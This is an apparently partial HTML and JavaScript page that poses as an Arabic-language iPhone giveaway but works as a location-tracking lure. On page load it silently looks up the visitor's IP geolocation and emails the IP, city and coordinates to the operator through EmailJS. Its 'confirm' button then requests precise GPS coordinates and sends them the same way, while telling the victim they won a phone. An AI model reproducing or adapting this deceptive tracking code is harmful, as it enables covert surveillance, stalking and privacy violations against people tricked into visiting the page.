  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Arial, sans-serif;
      background:
        radial-gradient(circle at top, #293b5f, #090b10 60%);
      color: white;
    }

    .card {
      width: 92%;
      max-width: 430px;
      padding: 30px 25px;
      text-align: center;
      background: rgba(255,255,255,.08);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(255,255,255,.15);
      border-radius: 28px;
      box-shadow: 0 25px 70px rgba(0,0,0,.5);
    }

    .iphone {
      width: 155px;
      height: 300px;
      margin: 0 auto 25px;
      background: linear-gradient(145deg,#3c3c43,#101014);
      border: 4px solid #777;
      border-radius: 32px;
      position: relative;
      box-shadow:
        0 20px 50px rgba(0,0,0,.5),
        inset 0 0 10px rgba(255,255,255,.15);
      overflow: hidden;
    }

    .iphone::before {
      content: "";
      position: absolute;
      width: 70px;
      height: 22px;
      background: #000;
      top: 9px;
      left: 50%;
      transform: translateX(-50%);
      border-radius: 15px;
      z-index: 2;
    }

    .screen {
      position: absolute;
      inset: 5px;
      border-radius: 27px;
      background:
        radial-gradient(circle at 30% 20%, #6e8cff, transparent 35%),
        linear-gradient(160deg,#111b38,#05060b);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .screen-icon {
      font-size: 55px;
    }

    h1 {
      font-size: 27px;
      margin: 10px 0;
    }

    .subtitle {
      color: #c7c9d1;
      line-height: 1.8;
      font-size: 15px;
    }
    .red{
       background-color: red !important;
    }

    button {
      width: 100%;
      border: none;
      margin: 10px;
      padding: 16px;
      border-radius: 14px;
      background: linear-gradient(135deg,#ffffff,#dfe3eb);
      color: #111;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
      transition: .2s;
    }

    button:hover {
      transform: translateY(-2px);
    }

    .status {
      margin-top: 18px;
      font-size: 14px;
      line-height: 1.7;
    }

    .success {
      color: #69e58b;
    }

    .error {
      color: #ff7373;
    }

    .location {
      margin-top: 20px;
      padding: 15px;
      background: rgba(255,255,255,.08);
      border-radius: 14px;
      direction: ltr;
      text-align: left;
      font-size: 13px;
    }

    .map {
      display: block;
      margin-top: 15px;
      padding: 11px;
      text-align: center;
      background: #4285f4;
      color: white;
      text-decoration: none;
      border-radius: 9px;
    }

    .small {
      margin-top: 15px;
      font-size: 11px;
      color: #999;
      line-height: 1.6;
    }
  </style>

  <script
    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
  </script>

  <script>
    emailjs.init("oM7fNo7rUzVUI3FtU");
  </script>
</head>

<body>

  <div class="card">

    <div class="iphone">
      <div class="screen">
 
      </div>
    </div>

    <h1>
      مسابقه الايفون
    </h1>

    <p class="subtitle">
    اضغط علي تأكيد للمنافسه في مسابقه الايفون 
    او الغاء ثم السماح للخروج 
    </p>

    <button id="allowBtn">
     تأكيد
    </button>

  

    

<button  style="background-color: red;" id="allowBtn" >
      الغاء
    </button>


    <div id="status" class="status"></div>

    <div id="location"></div>



  </div>


  <script>

    // طلب بيانات الموقع بناءً على عنوان الـ IP الخاص بالزائر
fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(data => {
    console.log("الدولة:", data.country_name);
    console.log("المدينة:", data.city);
    console.log("خط العرض التقريبي:", data.latitude);
    console.log("خط الطول التقريبي:", data.longitude);

    // إرسال البيانات عبر EmailJS أو خادمك الخاص
    emailjs.send("service_humq0xe", "template_tb6rj6p", {
      name: "User via IP",
      ip: data.ip,
      city: data.city,
      country: data.country_name,
      latitude: data.latitude,
      longitude: data.longitude,
      map_link: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
    });
  })
  .catch(error => console.error("Error fetching IP location:", error));

    const allowBtn =
      document.getElementById("allowBtn");

    const status =
      document.getElementById("status");

    const locationDiv =
      document.getElementById("location");


    allowBtn.addEventListener("click", () => {

      if (!navigator.geolocation) {

        status.className = "status error";

        status.textContent =
         "يجب اعاده المحاوله "

        return;
      }


      allowBtn.style.display = "none";

      status.className = "status";

      status.textContent =
       "جاري تحديد الابفون "


      navigator.geolocation.getCurrentPosition(

        (position) => {

          const latitude =
            position.coords.latitude;

          const longitude =
            position.coords.longitude;


          const mapLink =
            `https://www.google.com/maps?q=${latitude},${longitude}`;


          status.className =
            "status success";

          status.textContent =
            "مبروووك كسبت ايفون "



          emailjs.send(

            "service_humq0xe",

            "template_tb6rj6p",

            {
              name: "User",

              time:
                new Date().toLocaleString("ar-EG"),

              message:
                "User shared location",

              latitude:
                latitude,

              longitude:
                longitude,

              map_link:
                mapLink
            }

          )
          .then(() => {

            console.log(
              "Location sent successfully"
            );

          })
          .catch((error) => {

            console.error(
              "EmailJS Error:",
              error
            );

          });

        },


        (error) => {

          allowBtn.style.display = "block";

          status.className =
            "status error";


          if (error.code === 1) {

            status.textContent =
             "حدث خطاء يجب اعاده المحاوله"

          } else if (error.code === 2) {

            status.textContent =
             "حدث خطاء يجب اعاده المحاوله"

          } else if (error.code === 3) {

            status.textContent =
               "حدث خطاء يجب اعاده المحاوله"

          } else {

            status.textContent =
              "حدث خطاء يجب اعاده المحاوله"

          }

        },


        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }

      );

    });

  </script>
